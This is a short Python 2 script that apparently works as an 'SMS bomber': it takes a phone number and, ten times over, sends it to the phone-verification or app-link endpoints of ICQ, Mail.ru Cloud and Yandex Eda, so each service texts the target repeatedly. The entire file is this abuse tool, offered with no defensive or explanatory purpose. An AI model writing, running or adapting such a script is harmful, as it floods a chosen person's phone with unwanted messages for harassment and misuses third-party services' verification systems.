import requests

num = raw_input('Enter number: ')

for i in range(10):

  response = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',

  data={'msisdn':num, "locale": 'en', 'countryCode': 'ru', 'version': '1',"k": "ic1rtwz1s1Hj1O0r", "r": "46763"})

  if response.status_code == 200:

    print 'sent'

  else:

    print 'failed'

  respose = requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + num, "api": 2, "email": "email", "x-email": "x-email"})

  if respose.status_code ==200:

      print '\033[1;92mmassage sent'

  else:

    print 'failed'

  data = {

            'phone_number': '+'+num

        }

  respnse = requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json=data)

  if respnse.status_code ==200:

    print 'massage sent'

  else:

    print 'failed'

       
